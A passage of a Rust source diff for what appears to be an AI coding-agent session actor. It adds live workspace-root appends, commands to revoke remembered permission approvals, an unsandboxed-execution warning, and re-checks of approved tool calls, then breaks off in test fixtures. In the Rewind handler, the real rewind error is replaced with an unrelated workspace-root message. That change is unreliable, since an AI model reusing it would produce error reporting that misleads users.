@@ -2,7 +2,7 @@ use std::{
     collections::{BTreeMap, VecDeque},
     fmt,
     panic::AssertUnwindSafe,
-    path::{Component, PathBuf},
+    path::{Component, Path, PathBuf},
     sync::{
         Arc, Mutex,
         atomic::{AtomicBool, AtomicU64, Ordering},
@@ -410,6 +410,11 @@ enum PendingEvent {
     SessionCreated {
         driver_client_id: ClientId,
     },
+    WorkspaceRootsChanged {
+        generation: u64,
+        effective_from_turn: u64,
+        roots: Vec<rw_types::WorkspaceRootDescriptor>,
+    },
     TurnStarted {
         turn: u64,
     },
@@ -701,6 +706,16 @@ impl PendingEvent {
                 meta,
                 driver_client_id,
             },
+            Self::WorkspaceRootsChanged {
+                generation,
+                effective_from_turn,
+                roots,
+            } => EngineEvent::WorkspaceRootsChanged {
+                meta,
+                generation,
+                effective_from_turn,
+                roots,
+            },
             Self::TurnStarted { turn } => EngineEvent::TurnStarted {
                 meta,
                 turn_id: wire_turn_id(turn),
@@ -782,9 +797,17 @@ impl PendingEvent {
                 turn_id: wire_turn_id(turn),
                 tool_call_id: ToolCallId(request.id),
                 name: request.tool_name.clone(),
+                rationale: if request.tool_name == "bash"
+                    && request.arguments.get("sandbox").and_then(Value::as_str)
+                        == Some("unsandboxed")
+                {
+                    "UNSANDBOXED EXECUTION: this command will bypass native filesystem and network isolation"
+                        .to_owned()
+                } else {
+                    format!("permission required for tool `{}`", request.tool_name)
+                },
                 args: request.arguments,
                 capabilities: request.capabilities,
-                rationale: format!("permission required for tool `{}`", request.tool_name),
                 diff: request.approval_diff,
             },
             Self::ToolOutput {
@@ -1109,6 +1132,8 @@ pub struct SessionSnapshot {
     pub approved_plan: Option<PlanArtifact>,
     pub plan_gate_active: bool,
     pub active_shell: Option<RecoveredUserShell>,
+    pub workspace_generation: u64,
+    pub workspace_roots: Vec<rw_types::WorkspaceRootDescriptor>,
 }
 
 /// Persisted actor state supplied when resuming a session from its event log.
@@ -1136,6 +1161,8 @@ pub struct SessionRecoveredState {
     pub approved_plan: Option<PlanArtifact>,
     pub plan_gate_active: bool,
     pub active_shell: Option<RecoveredUserShell>,
+    pub workspace_generation: u64,
+    pub workspace_roots: Vec<rw_types::WorkspaceRootDescriptor>,
 }
 
 /// Durable foreground-shell gate reconstructed from the session log.
@@ -1189,6 +1216,8 @@ pub enum SessionProjectionError {
     InvalidShellTransition(String),
     #[error("unknown built-in mode id `{0}` in durable session")]
     InvalidMode(String),
+    #[error("invalid durable workspace-root generation")]
+    InvalidWorkspaceGeneration,
 }
 
 fn parse_turn_id(turn_id: &TurnId) -> Result<u64, SessionProjectionError> {
@@ -1520,6 +1549,16 @@ fn recovered_pending_event(
         } => PendingEvent::SessionCreated {
             driver_client_id: driver_client_id.clone(),
         },
+        EngineEvent::WorkspaceRootsChanged {
+            generation,
+            effective_from_turn,
+            roots,
+            ..
+        } => PendingEvent::WorkspaceRootsChanged {
+            generation: *generation,
+            effective_from_turn: *effective_from_turn,
+            roots: roots.clone(),
+        },
         EngineEvent::ModelChanged { model, .. } => PendingEvent::ModelChanged {
             model: model.clone(),
         },
@@ -1611,6 +1650,8 @@ pub fn project_session_events(
     let mut approved_plan = None;
     let mut plan_gate_active = false;
     let mut active_shell = None::<RecoveredUserShell>;
+    let mut workspace_generation = 0_u64;
+    let mut workspace_roots = Vec::new();
     let mut compacted_conversation = None::<Vec<(u64, Turn)>>;
     let mut compaction_surgery_start = None::<usize>;
     let mut budgeter = Budgeter::default();
@@ -1911,6 +1952,28 @@ pub fn project_session_events(
             PendingEvent::QuestionAnswered { question_id, .. } => {
                 pending_questions.remove(&question_id.0);
             }
+            PendingEvent::WorkspaceRootsChanged {
+                generation, roots, ..
+            } => {
+                if *generation != workspace_generation.saturating_add(1)
+                    || roots.is_empty()
+                    || roots.iter().enumerate().any(|(index, root)| {
+                        root.index != u32::try_from(index).unwrap_or(u32::MAX)
+                            || root.machine_local
+                            || root.path != format!("@root/{index}")
+                    })
+                    || (!workspace_roots.is_empty()
+                        && roots
+                            .iter()
+                            .take(workspace_roots.len())
+                            .ne(workspace_roots.iter()))
+                    || (!workspace_roots.is_empty() && roots.len() != workspace_roots.len() + 1)
+                {
+                    return Err(SessionProjectionError::InvalidWorkspaceGeneration);
+                }
+                workspace_generation = *generation;
+                workspace_roots.clone_from(roots);
+            }
             PendingEvent::SessionCreated {
                 driver_client_id: driver,
             }
@@ -2073,6 +2136,8 @@ pub fn project_session_events(
         approved_plan,
         plan_gate_active,
         active_shell,
+        workspace_generation,
+        workspace_roots,
     })
 }
 
@@ -2481,17 +2546,27 @@ pub enum SessionCommandAction {
     RemovePermissionRule {
         pattern: String,
     },
-    ClearPermissionRules,
+    ClearSessionPermissions,
+    ListPermissionApprovals,
+    RevokeSessionApprovals {
+        id: Option<String>,
+    },
+    RevokeProjectApprovals {
+        id: Option<String>,
+    },
     Trust {
         operation: FolderTrustOperation,
+    },
+    AddWorkspaceRoot {
+        path: PathBuf,
     },
 }
 
 /// Explicit folder-trust ledger operation requested by `/trust`.
-#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+#[derive(Clone, Debug, Eq, PartialEq)]
 pub enum FolderTrustOperation {
     Status,
-    Grant,
+    Grant { confirmation: Option<String> },
     Revoke,
 }
 
@@ -2511,6 +2586,78 @@ impl FolderTrustController for NoopFolderTrustController {
         Err(AgentLoopError::InvalidConfiguration(
             "folder trust is unavailable for this session host".to_owned(),
         ))
+    }
+}
+
+/// Complete immutable runtime boundary swapped after a live root append.
+pub struct WorkspaceRuntimeGeneration {
+    pub generation: u64,
+    pub effective_from_turn: u64,
+    pub roots: Vec<PathBuf>,
+    pub tools: Arc<ToolRegistry>,
+    pub permissions: Arc<PermissionGate>,
+    pub checkpoints: Arc<dyn MutationCheckpointCoordinator>,
+    pub folder_trust: Arc<dyn FolderTrustController>,
+    pub supplemental_context: Vec<Turn>,
+}
+
+impl fmt::Debug for WorkspaceRuntimeGeneration {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter
+            .debug_struct("WorkspaceRuntimeGeneration")
+            .field("generation", &self.generation)
+            .field("effective_from_turn", &self.effective_from_turn)
+            .field("roots", &self.roots)
+            .field("supplemental_context", &self.supplemental_context)
+            .finish_non_exhaustive()
+    }
+}
+
+/// Host-owned builder and persistence boundary for live workspace generations.
+#[async_trait]
+pub trait WorkspaceRootController: Send + Sync {
+    async fn append_root(
+        &self,
+        requested: &Path,
+        current_roots: &[PathBuf],
+        current_generation: u64,
+        effective_from_turn: u64,
+        permissions: Arc<PermissionGate>,
+    ) -> Result<WorkspaceRuntimeGeneration, AgentLoopError>;
+
+    async fn commit_generation(&self, generation: u64) -> Result<(), AgentLoopError>;
+
+    async fn abort_generation(&self, _generation: u64) -> Result<(), AgentLoopError> {
+        Ok(())
+    }
+}
+
+#[derive(Debug, Default)]
+pub struct NoopWorkspaceRootController;
+
+#[async_trait]
+impl WorkspaceRootController for NoopWorkspaceRootController {
+    async fn append_root(
+        &self,
+        _requested: &Path,
+        _current_roots: &[PathBuf],
+        _current_generation: u64,
+        _effective_from_turn: u64,
+        _permissions: Arc<PermissionGate>,
+    ) -> Result<WorkspaceRuntimeGeneration, AgentLoopError> {
+        Err(AgentLoopError::InvalidConfiguration(
+            "live workspace-root changes are unavailable for this session host".to_owned(),
+        ))
+    }
+
+    async fn commit_generation(&self, _generation: u64) -> Result<(), AgentLoopError> {
+        Err(AgentLoopError::InvalidConfiguration(
+            "live workspace-root changes are unavailable for this session host".to_owned(),
+        ))
+    }
+
+    async fn abort_generation(&self, _generation: u64) -> Result<(), AgentLoopError> {
+        Ok(())
     }
 }
 
@@ -2559,7 +2706,7 @@ impl CommandHandler<SessionCommandContext, SessionCommandOutput> for HelpCommand
         _invocation: CommandInvocation,
     ) -> Result<SessionCommandOutput, CommandExecutionError> {
         Ok(SessionCommandOutput {
-            message: "/help, /status, /mode [discuss|plan|execute], /plan, /permissions [list|add|remove|clear-session], /interrupt, /rewind <turn>, /context [pin|evict <item-id>], /cost, /compact [instructions], /trust, /add-dir <path>".to_owned(),
+            message: "/help, /status, /mode [discuss|plan|execute], /plan, /permissions [list|approvals|add|remove|clear-session|revoke-session|revoke-project], /interrupt, /rewind <turn>, /context [pin|evict <item-id>], /cost, /compact [instructions], /trust, /add-dir <path>".to_owned(),
             action: SessionCommandAction::None,
         })
     }
@@ -2624,8 +2771,30 @@ impl CommandHandler<SessionCommandContext, SessionCommandOutput> for Permissions
         if arguments == "clear-session" {
             return Ok(SessionCommandOutput {
                 message: String::new(),
-                action: SessionCommandAction::ClearPermissionRules,
+                action: SessionCommandAction::ClearSessionPermissions,
             });
+        }
+        if arguments == "approvals" {
+            return Ok(SessionCommandOutput {
+                message: String::new(),
+                action: SessionCommandAction::ListPermissionApprovals,
+            });
+        }
+        for (prefix, project) in [("revoke-session ", false), ("revoke-project ", true)] {
+            if let Some(value) = arguments.strip_prefix(prefix).map(str::trim) {
+                if value.is_empty() {
+                    return Err(invalid_permissions_command());
+                }
+                let id = (value != "all").then(|| value.to_owned());
+                return Ok(SessionCommandOutput {
+                    message: String::new(),
+                    action: if project {
+                        SessionCommandAction::RevokeProjectApprovals { id }
+                    } else {
+                        SessionCommandAction::RevokeSessionApprovals { id }
+                    },
+                });
+            }
         }
         if let Some(pattern) = arguments.strip_prefix("remove ").map(str::trim) {
             if pattern.is_empty() {
@@ -2669,7 +2838,7 @@ impl CommandHandler<SessionCommandContext, SessionCommandOutput> for Permissions
 fn invalid_permissions_command() -> CommandExecutionError {
     CommandExecutionError::new(
         "invalid_permissions_command",
-        "usage: /permissions [list | add <allow|ask|deny> <tool(glob)> | remove <tool(glob)> | clear-session]",
+        "usage: /permissions [list | approvals | add <allow|ask|deny> <tool(glob)> | remove <tool(glob)> | clear-session | revoke-session <id|all> | revoke-project <id|all>]",
     )
 }
 
@@ -2807,10 +2976,17 @@ impl CommandHandler<SessionCommandContext, SessionCommandOutput> for TrustComman
         _context: &mut SessionCommandContext,
         invocation: CommandInvocation,
     ) -> Result<SessionCommandOutput, CommandExecutionError> {
-        let operation = match invocation.arguments().trim() {
-            "" | "status" => FolderTrustOperation::Status,
-            "grant" => FolderTrustOperation::Grant,
-            "revoke" => FolderTrustOperation::Revoke,
+        let arguments = invocation
+            .arguments()
+            .split_whitespace()
+            .collect::<Vec<_>>();
+        let operation = match arguments.as_slice() {
+            [] | ["status"] => FolderTrustOperation::Status,
+            ["grant"] => FolderTrustOperation::Grant { confirmation: None },
+            ["grant", confirmation] => FolderTrustOperation::Grant {
+                confirmation: Some((*confirmation).to_owned()),
+            },
+            ["revoke"] => FolderTrustOperation::Revoke,
             _ => {
                 return Err(CommandExecutionError::new(
                     "invalid_trust_command",
@@ -2831,7 +3007,7 @@ struct AddDirCommand;
 impl CommandHandler<SessionCommandContext, SessionCommandOutput> for AddDirCommand {
     async fn execute(
         &self,
-        _context: &mut SessionCommandContext,
+        context: &mut SessionCommandContext,
         invocation: CommandInvocation,
     ) -> Result<SessionCommandOutput, CommandExecutionError> {
         let path = invocation.arguments().trim();
@@ -2841,11 +3017,17 @@ impl CommandHandler<SessionCommandContext, SessionCommandOutput> for AddDirComma
                 "usage: /add-dir <path>",
             ));
         }
+        if context.running() {
+            return Err(CommandExecutionError::new(
+                "turn_running",
+                "adding a workspace root requires an idle session",
+            ));
+        }
         Ok(SessionCommandOutput {
-            message: format!(
-                "workspace roots are fixed when a session starts; restart with `rw --add-dir {path}` so tools, permissions, and the sandbox share one root set"
-            ),
-            action: SessionCommandAction::None,
+            message: String::new(),
+            action: SessionCommandAction::AddWorkspaceRoot {
+                path: PathBuf::from(path),
+            },
         })
     }
 }
@@ -2908,7 +3090,7 @@ pub fn builtin_command_registry()
                 "Show or edit session-scoped permission rules",
             )
             .with_argument_hint(
-                "[list|add <allow|ask|deny> <tool(glob)>|remove <tool(glob)>|clear-session]",
+                "[list|approvals|add|remove|clear-session|revoke-session|revoke-project]",
             ),
             PermissionsCommand,
         )
@@ -2961,7 +3143,7 @@ pub fn builtin_command_registry()
         .map_err(|error| AgentLoopError::Extension(error.to_string()))?;
     registry
         .register(
-            CommandDescriptor::new("add-dir", "Add a workspace root on session restart")
+            CommandDescriptor::new("add-dir", "Append a live workspace root")
                 .with_argument_hint("<path>"),
             AddDirCommand,
         )
@@ -3015,6 +3197,7 @@ pub struct SessionActorConfig {
     pub session_id: SessionId,
     pub workspace_root: PathBuf,
     pub additional_workspace_roots: Vec<PathBuf>,
+    pub workspace_generation: u64,
     pub initial_session_context: Vec<Turn>,
     pub model_alias: String,
     pub model: Arc<dyn ModelDriver>,
@@ -3027,6 +3210,7 @@ pub struct SessionActorConfig {
     pub secret_redactor: Arc<dyn SecretRedactor>,
     pub checkpoints: Arc<dyn MutationCheckpointCoordinator>,
     pub folder_trust: Arc<dyn FolderTrustController>,
+    pub workspace_roots: Arc<dyn WorkspaceRootController>,
     pub recovered: SessionRecoveredState,
     pub max_turns: usize,
     pub identical_tool_failure_limit: usize,
@@ -3045,6 +3229,7 @@ impl fmt::Debug for SessionActorConfig {
                 "additional_workspace_roots",
                 &self.additional_workspace_roots,
             )
+            .field("workspace_generation", &self.workspace_generation)
             .field("initial_session_context", &self.initial_session_context)
             .field("model_alias", &self.model_alias)
             .field("recovered", &self.recovered)
@@ -3066,6 +3251,7 @@ impl SessionActorConfig {
             session_id: self.session_id.clone(),
             workspace_root: self.workspace_root.clone(),
             additional_workspace_roots: self.additional_workspace_roots.clone(),
+            workspace_generation: self.workspace_generation,
             initial_session_context: self.initial_session_context.clone(),
             model_alias,
             model: Arc::clone(&self.model),
@@ -3078,6 +3264,7 @@ impl SessionActorConfig {
             secret_redactor: Arc::clone(&self.secret_redactor),
             checkpoints: Arc::clone(&self.checkpoints),
             folder_trust: Arc::clone(&self.folder_trust),
+            workspace_roots: Arc::clone(&self.workspace_roots),
             recovered: self.recovered.clone(),
             max_turns: self.max_turns,
             identical_tool_failure_limit: self.identical_tool_failure_limit,
@@ -3085,6 +3272,21 @@ impl SessionActorConfig {
             thinking: self.thinking,
             event_capacity: self.event_capacity,
         }
+    }
+
+    fn with_workspace_generation(&self, generation: &WorkspaceRuntimeGeneration) -> Self {
+        let mut configured = self.with_model_alias(self.model_alias.clone());
+        configured.workspace_root.clone_from(&generation.roots[0]);
+        configured.additional_workspace_roots = generation.roots.iter().skip(1).cloned().collect();
+        configured.workspace_generation = generation.generation;
+        configured.tools = Arc::clone(&generation.tools);
+        configured.permissions = Arc::clone(&generation.permissions);
+        configured.checkpoints = Arc::clone(&generation.checkpoints);
+        configured.folder_trust = Arc::clone(&generation.folder_trust);
+        configured
+            .initial_session_context
+            .extend(generation.supplemental_context.iter().cloned());
+        configured
     }
 
     fn with_model_alias_and_mode(&self, model_alias: String, mode: SessionMode) -> Self {
@@ -3975,7 +4177,7 @@ async fn dispatch_lifecycle_hook(
 #[allow(clippy::too_many_lines)]
 async fn run_actor(
     config: SessionActorConfig,
-    tool_context: ToolContext,
+    mut tool_context: ToolContext,
     mut commands: mpsc::Receiver<ActorCommand>,
     events: broadcast::Sender<RoutedEvent>,
     active_turn: Arc<AtomicU64>,
@@ -3987,7 +4189,7 @@ async fn run_actor(
         &config.recovered,
     );
     let interrupted_turn = config.recovered.interrupted_turn;
-    let config = Arc::new(config);
+    let mut config = Arc::new(config);
     let (turn_signals, mut signals) = mpsc::unbounded_channel();
     if !dispatch_lifecycle_hook(HookEvent::SessionStart, &mut state, &config, &events).await {
         let _ = dispatch_lifecycle_hook(HookEvent::SessionEnd, &mut state, &config, &events).await;
@@ -4079,8 +4281,8 @@ async fn run_actor(
                 handle_actor_command(
                     command,
                     &mut state,
-                    &config,
-                    &tool_context,
+                    &mut config,
+                    &mut tool_context,
                     &turn_signals,
                     &events,
                     &active_turn,
@@ -5125,8 +5327,8 @@ fn start_manual_compaction(
 async fn handle_actor_command(
     command: ActorCommand,
     state: &mut ActorState,
-    config: &Arc<SessionActorConfig>,
-    tool_context: &ToolContext,
+    config: &mut Arc<SessionActorConfig>,
+    tool_context: &mut ToolContext,
     turn_signals: &mpsc::UnboundedSender<TurnSignal>,
     events: &broadcast::Sender<RoutedEvent>,
     active_turn: &Arc<AtomicU64>,
@@ -6230,8 +6432,13 @@ async fn handle_actor_command(
                             SessionCommandAction::Rewind { to_turn } => {
                                 match rewind_state(state, config, events, to_turn).await {
                                     Ok(report) => unrestorable_paths = report,
-                                    Err(error) => {
-                                        let _ = respond.send(Err(error));
+                                    Err(_error) => {
+                                        let _ = respond.send(Err(
+                                            AgentLoopError::InvalidConfiguration(
+                                                "workspace root generation could not prepare"
+                                                    .to_owned(),
+                                            ),
+                                        ));
                                         return;
                                     }
                                 }
@@ -6363,10 +6570,151 @@ async fn handle_actor_command(
                                     format!("no session permission rule matched: {pattern}")
                                 };
                             }
-                            SessionCommandAction::ClearPermissionRules => {
-                                let removed = config.permissions.clear_session_rules();
-                                output.message =
-                                    format!("cleared {removed} session permission rule(s)");
+                            SessionCommandAction::ClearSessionPermissions => {
+                                let cleared = config.permissions.clear_session_permissions();
+                                output.message = format!(
+                                    "cleared {} session permission rule(s) and {} remembered approval(s)",
+                                    cleared.rules, cleared.approvals
+                                );
+                            }
+                            SessionCommandAction::ListPermissionApprovals => {
+                                output.message = serde_json::to_string_pretty(
+                                    &config.permissions.approval_snapshot(),
+                                )
+                                .unwrap_or_else(|_| "approval state unavailable".to_owned());
+                            }
+                            SessionCommandAction::RevokeSessionApprovals { id } => {
+                                let removed =
+                                    config.permissions.revoke_session_approvals(id.as_deref());
+                                output.message = format!("revoked {removed} session approval(s)");
+                            }
+                            SessionCommandAction::RevokeProjectApprovals { id } => {
+                                match config.permissions.revoke_project_approvals(id.as_deref()) {
+                                    Ok(removed) => {
+                                        output.message =
+                                            format!("revoked {removed} project approval(s)");
+                                    }
+                                    Err(error) => {
+                                        let _ = respond.send(Err(
+                                            AgentLoopError::InvalidConfiguration(format!(
+                                                "project approval revocation failed: {error}"
+                                            )),
+                                        ));
+                                        return;
+                                    }
+                                }
+                            }
+                            SessionCommandAction::AddWorkspaceRoot { path } => {
+                                let current_roots = std::iter::once(config.workspace_root.clone())
+                                    .chain(config.additional_workspace_roots.iter().cloned())
+                                    .collect::<Vec<_>>();
+                                let generation = match config
+                                    .workspace_roots
+                                    .append_root(
+                                        &path,
+                                        &current_roots,
+                                        config.workspace_generation,
+                                        state.next_turn,
+                                        Arc::clone(&config.permissions),
+                                    )
+                                    .await
+                                {
+                                    Ok(generation) => generation,
+                                    Err(error) => {
+                                        let _ = respond.send(Err(error));
+                                        return;
+                                    }
+                                };
+                                let valid_append = generation.generation
+                                    == config.workspace_generation.saturating_add(1)
+                                    && generation.effective_from_turn == state.next_turn
+                                    && generation.roots.len() == current_roots.len() + 1
+                                    && generation
+                                        .roots
+                                        .iter()
+                                        .take(current_roots.len())
+                                        .eq(current_roots.iter())
+                                    && generation.roots.iter().all(|root| {
+                                        std::fs::canonicalize(root)
+                                            .is_ok_and(|canonical| canonical == *root)
+                                    });
+                                if !valid_append {
+                                    let _ = config
+                                        .workspace_roots
+                                        .abort_generation(generation.generation)
+                                        .await;
+                                    let _ = respond.send(Err(
+                                        AgentLoopError::InvalidConfiguration(
+                                            "workspace root controller returned a non-canonical or non-append generation"
+                                                .to_owned(),
+                                        ),
+                                    ));
+                                    return;
+                                }
+                                let replacement_context =
+                                    match ToolContext::from_workspace_roots(&generation.roots) {
+                                        Ok(context) => {
+                                            context.with_session_id(config.session_id.clone())
+                                        }
+                                        Err(_error) => {
+                                            let _ = config
+                                                .workspace_roots
+                                                .abort_generation(generation.generation)
+                                                .await;
+                                            let _ = respond.send(Err(AgentLoopError::ToolContext(
+                                                "workspace tool context could not prepare"
+                                                    .to_owned(),
+                                            )));
+                                            return;
+                                        }
+                                    };
+                                let descriptors = generation
+                                    .roots
+                                    .iter()
+                                    .enumerate()
+                                    .map(|(index, _root)| rw_types::WorkspaceRootDescriptor {
+                                        index: u32::try_from(index).unwrap_or(u32::MAX),
+                                        path: format!("@root/{index}"),
+                                        machine_local: false,
+                                    })
+                                    .collect::<Vec<_>>();
+                                if let Err(_error) = emit(
+                                    state,
+                                    events,
+                                    &config.event_sink,
+                                    PendingEvent::WorkspaceRootsChanged {
+                                        generation: generation.generation,
+                                        effective_from_turn: generation.effective_from_turn,
+                                        roots: descriptors,
+                                    },
+                                )
+                                .await
+                                {
+                                    let _ = config
+                                        .workspace_roots
+                                        .abort_generation(generation.generation)
+                                        .await;
+                                    let _ = respond.send(Err(AgentLoopError::Persistence(
+                                        "workspace root change event could not persist".to_owned(),
+                                    )));
+                                    return;
+                                }
+                                let commit_warning = config
+                                    .workspace_roots
+                                    .commit_generation(generation.generation)
+                                    .await
+                                    .err();
+                                *config = Arc::new(config.with_workspace_generation(&generation));
+                                *tool_context = replacement_context;
+                                output.message = format!(
+                                    "added workspace root @root/{}",
+                                    generation.roots.len() - 1
+                                );
+                                if commit_warning.is_some() {
+                                    output.message.push_str(
+                                        "; local generation marker repair is required on resume",
+                                    );
+                                }
                             }
                             SessionCommandAction::Trust { operation } => {
                                 match config.folder_trust.execute(operation).await {
@@ -6526,6 +6874,16 @@ async fn handle_actor_command(
                 approved_plan: state.approved_plan.clone(),
                 plan_gate_active: state.plan_gate_active,
                 active_shell: state.active_shell.clone(),
+                workspace_generation: config.workspace_generation,
+                workspace_roots: std::iter::once(&config.workspace_root)
+                    .chain(&config.additional_workspace_roots)
+                    .enumerate()
+                    .map(|(index, _root)| rw_types::WorkspaceRootDescriptor {
+                        index: u32::try_from(index).unwrap_or(u32::MAX),
+                        path: format!("@root/{index}"),
+                        machine_local: false,
+                    })
+                    .collect(),
             });
         }
     }
@@ -7146,6 +7504,12 @@ struct ToolExecution {
     is_error: bool,
 }
 
+struct AuthorizedToolBinding {
+    approval_diff: Option<ApprovalBinding>,
+    execution_identity: String,
+    capabilities: Vec<rw_types::ToolCapability>,
+}
+
 enum PreparedToolCall {
     Execute {
         call: PendingToolCall,
@@ -7153,7 +7517,7 @@ enum PreparedToolCall {
         arguments: Value,
         read_only: bool,
         mutation_scope: MutationScope,
-        approval_binding: Option<ApprovalBinding>,
+        authorization: AuthorizedToolBinding,
     },
     Complete(ToolExecution),
 }
@@ -7903,7 +8267,7 @@ async fn authorize_tool_call(
     cancellation: &CancellationToken,
     signals: &mpsc::UnboundedSender<TurnSignal>,
     mode: SessionMode,
-) -> Result<Option<ApprovalBinding>, String> {
+) -> Result<AuthorizedToolBinding, String> {
     let mut request = PermissionRequest {
         id: call.id.clone(),
         tool_name: call.name.clone(),
@@ -7912,7 +8276,11 @@ async fn authorize_tool_call(
         approval_diff: None,
     };
     request.approval_diff = current_approval_diff(tool, context, &request).await?;
-    let binding = request.approval_diff.as_ref().map(diff_binding);
+    let authorization = AuthorizedToolBinding {
+        approval_diff: request.approval_diff.as_ref().map(diff_binding),
+        execution_identity: PermissionGate::execution_identity(&request),
+        capabilities: request.capabilities.clone(),
+    };
     let displayed = redacted_permission_request(request.clone(), config.secret_redactor.as_ref());
     let permission_hook = dispatch_hook(
         &config.hooks,
@@ -7946,10 +8314,13 @@ async fn authorize_tool_call(
             mode,
         )
         .await;
-    if permission == PermissionOutcome::Denied {
-        Err(format!("permission denied for tool `{}`", call.name))
-    } else {
-        Ok(binding)
+    match permission {
+        PermissionOutcome::Allowed => Ok(authorization),
+        PermissionOutcome::Denied => Err(format!("permission denied for tool `{}`", call.name)),
+        PermissionOutcome::RememberedApprovalUnavailable => Err(format!(
+            "remembered_permission_unavailable: tool `{}` cannot safely remember this invocation; choose allow once",
+            call.name
+        )),
     }
 }
 
@@ -8003,7 +8374,7 @@ async fn prepare_tool_call(
             format!("unknown tool `{name}`"),
         ));
     };
-    let mut approval_binding = match authorize_tool_call(
+    let mut authorization = match authorize_tool_call(
         &call,
         &arguments,
         initial_security.capabilities.clone(),
@@ -8085,7 +8456,7 @@ async fn prepare_tool_call(
         ));
     };
     if call.name != original_name || arguments != original_arguments {
-        approval_binding = match authorize_tool_call(
+        authorization = match authorize_tool_call(
             &call,
             &arguments,
             security.capabilities.clone(),
@@ -8109,7 +8480,7 @@ async fn prepare_tool_call(
         arguments,
         read_only: security.read_only,
         mutation_scope: security.mutation_scope,
-        approval_binding,
+        authorization,
     }
 }
 
@@ -8271,15 +8642,15 @@ async fn execute_prepared_tool(
     checkpoints: Arc<dyn MutationCheckpointCoordinator>,
     turn: u64,
 ) -> (ToolExecution, bool) {
-    let (call, tool, arguments, mutation_scope, approval_binding) = match prepared {
+    let (call, tool, arguments, mutation_scope, authorization) = match prepared {
         PreparedToolCall::Execute {
             call,
             tool,
             arguments,
             mutation_scope,
-            approval_binding,
+            authorization,
             ..
-        } => (call, tool, arguments, mutation_scope, approval_binding),
+        } => (call, tool, arguments, mutation_scope, authorization),
         PreparedToolCall::Complete(execution) => return (execution, false),
     };
     let checkpoint = if matches!(mutation_scope, MutationScope::None) {
@@ -8319,28 +8690,26 @@ async fn execute_prepared_tool(
         totals: Mutex::new((0, 0, false)),
     });
     let invocation_context = context.with_output(sink);
-    let revalidation = if let Some(expected) = approval_binding {
+    let execution_request = PermissionRequest {
+        id: call.id.clone(),
+        tool_name: call.name.clone(),
+        arguments: arguments.clone(),
+        capabilities: authorization.capabilities.clone(),
+        approval_diff: None,
+    };
+    let diff_revalidation = if let Some(expected) = authorization.approval_diff {
         match tool.approval_preview(&invocation_context, &arguments).await {
-            Ok(Some(preview)) => {
-                let request = PermissionRequest {
-                    id: call.id.clone(),
-                    tool_name: call.name.clone(),
-                    arguments: arguments.clone(),
-                    capabilities: Vec::new(),
-                    approval_diff: None,
-                };
-                approval_diff(&request, &preview)
-                    .as_ref()
-                    .map(diff_binding)
-                    .filter(|current| current == &expected)
-                    .map(|_| ())
-                    .ok_or_else(|| {
-                        ToolError::Command(
-                            "approved diff is stale; no mutation ran; request a fresh approval"
-                                .to_owned(),
-                        )
-                    })
-            }
+            Ok(Some(preview)) => approval_diff(&execution_request, &preview)
+                .as_ref()
+                .map(diff_binding)
+                .filter(|current| current == &expected)
+                .map(|_| ())
+                .ok_or_else(|| {
+                    ToolError::Command(
+                        "approved diff is stale; no mutation ran; request a fresh approval"
+                            .to_owned(),
+                    )
+                }),
             Ok(None) => Err(ToolError::Command(
                 "approved diff can no longer be reproduced; no mutation ran".to_owned(),
             )),
@@ -8351,6 +8720,16 @@ async fn execute_prepared_tool(
     } else {
         Ok(())
     };
+    let revalidation = diff_revalidation.and_then(|()| {
+        (PermissionGate::execution_identity(&execution_request) == authorization.execution_identity)
+            .then_some(())
+            .ok_or_else(|| {
+                ToolError::Command(
+                    "approved invocation identity changed; no tool ran; request fresh approval"
+                        .to_owned(),
+                )
+            })
+    });
     let result = if let Err(error) = revalidation {
         Err(error)
     } else if cancellation.is_cancelled() {
@@ -10983,6 +11362,49 @@ mod tests {
         }
     }
 
+    #[derive(Default)]
+    struct WorkspaceChangeFailingSink {
+        inner: RecordingSink,
+    }
+
+    #[async_trait]
+    impl SessionEventSink for WorkspaceChangeFailingSink {
+        async fn append(&self, event: EngineEvent) -> Result<EngineEvent, AgentLoopError> {
+            if matches!(&event, EngineEvent::WorkspaceRootsChanged { .. }) {
+                return Err(AgentLoopError::Persistence(
+                    "workspace change fixture failure".to_owned(),
+                ));
+            }
+            self.inner.append(event).await
+        }
+
+        async fn append_batch(
+            &self,
+            events: Vec<EngineEvent>,
+        ) -> Result<Vec<EngineEvent>, AgentLoopError> {
+            if events
+                .iter()
+                .any(|event| matches!(event, EngineEvent::WorkspaceRootsChanged { .. }))
+            {
+                return Err(AgentLoopError::Persistence(
+                    "workspace change fixture failure".to_owned(),
+                ));
+            }
+            self.inner.append_batch(events).await
+        }
+
+        async fn read_after(
+            &self,
+            last_seen: Option<SequenceId>,
+        ) -> Result<Vec<EngineEvent>, AgentLoopError> {
+            self.inner.read_after(last_seen).await
+        }
+
+        async fn last_sequence(&self) -> Result<Option<SequenceId>, AgentLoopError> {
+            self.inner.last_sequence().await
+        }
+    }
+
     #[derive(Clone, Copy)]
     enum MalformedBatchMode {
         Payload,
@@ -11306,6 +11728,15 @@ mod tests {
 
     struct PermissionAllowHook;
 
+    struct StaticApprover(ApprovalDecision);
+
+    #[async_trait]
+    impl PermissionApprover for StaticApprover {
+        async fn decide(&self, _request: PermissionRequest) -> ApprovalDecision {
+            self.0.clone()
+        }
+    }
+
     #[async_trait]
     impl HookHandler for PermissionAllowHook {
         async fn invoke(&self, invocation: HookInvocation<'_>) -> Result<HookDirective, HookError> {
@@ -11350,14 +11781,62 @@ mod tests {
         operations: Mutex<Vec<FolderTrustOperation>>,
     }
 
+    struct FixedWorkspaceRootController {
+        roots: Vec<PathBuf>,
+        tools: Arc<ToolRegistry>,
+        permissions: Arc<PermissionGate>,
+        committed: AtomicU64,
+        aborted: AtomicU64,
+        fail_commit: bool,
+    }
+
+    #[async_trait]
+    impl WorkspaceRootController for FixedWorkspaceRootController {
+        async fn append_root(
+            &self,
+            _requested: &Path,
+            _current_roots: &[PathBuf],
+            current_generation: u64,
+            effective_from_turn: u64,
+            _permissions: Arc<PermissionGate>,
+        ) -> Result<WorkspaceRuntimeGeneration, AgentLoopError> {
+            Ok(WorkspaceRuntimeGeneration {
+                generation: current_generation + 1,
+                effective_from_turn,
+                roots: self.roots.clone(),
+                tools: Arc::clone(&self.tools),
+                permissions: Arc::clone(&self.permissions),
+                checkpoints: Arc::new(NoopMutationCheckpointCoordinator),
+                folder_trust: Arc::new(NoopFolderTrustController),
+                supplemental_context: Vec::new(),
+            })
+        }
+
+        async fn commit_generation(&self, generation: u64) -> Result<(), AgentLoopError> {
+            if self.fail_commit {
